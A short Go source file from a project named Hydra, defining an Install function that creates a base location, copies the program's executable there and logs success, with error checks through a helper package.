package install

import (
	"log"

	"github.com/Raffy27/Hydra/util"
)

func Install() {
	err := CreateBase()
	util.Panicln(err, "Base creation failed")
	err = CopyExecutable()
	util.Panicln(err, "Binary relocation failed")
	log.Println("Install successful")
}
